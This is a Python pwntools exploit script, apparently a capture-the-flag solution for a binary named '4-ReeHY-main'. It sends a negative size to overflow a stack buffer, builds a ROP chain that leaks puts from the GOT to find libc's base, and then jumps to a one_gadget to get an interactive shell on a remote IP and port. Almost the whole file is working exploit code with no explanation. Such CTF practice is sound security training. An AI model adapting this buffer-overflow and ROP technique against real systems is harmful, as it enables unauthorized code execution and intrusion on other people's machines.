#coding:utf-8
from pwn import *
#context.log_level='debug'
native = 1
# if native == 1:
#     io = process('./4-ReeHY-main')
#     libc = ELF('/home/keer/桌面/glibc-2.19/glibc-2.19/_debug/lib/libc-2.19.so')
#     libc_one_gadget_addr = 0xcf89a
# else:
#     io = remote('111.198.29.45', 51162)
#     libc = ELF('./libc-2.23.so')
libc_one_gadget_addr = 0x45216
io = process('./4-ReeHY-main')
io = remote("111.198.29.45", "30002")
elf = ELF('./4-ReeHY-main')
libc = ELF("/libc64.so.6")
io.sendlineafter('$ ', '1234')


def add(a, b, c):
    io.sendlineafter('$ ', '1')
    io.sendlineafter('Input size\n', str(a))
    io.sendlineafter('Input cun\n', str(b))
    io.sendlineafter('Input content', c)


pop_rdi = 0x400da3
main_addr = 0x400c8c

add(
    -1, 1, 'a' * 0x88 + '\x00' * 0x8 + 'a' * 0x8 + p64(pop_rdi) +
    p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main_addr))

io.recv()
puts_addr = u64(io.recv()[:6].ljust(8, '\x00'))
log.success('puts_addr:' + hex(puts_addr))
libc_base = puts_addr - libc.symbols['puts']
one_gadget_addr = libc_base + libc_one_gadget_addr
log.success('libc_base:' + hex(libc_base))
log.success('one_gadget_addr:' + hex(one_gadget_addr))
io.sendline('1234')
add(-1, 1, 'a' * 0x88 + '\x00' * 0x8 + 'a' * 0x8 + p64(one_gadget_addr))

io.interactive()
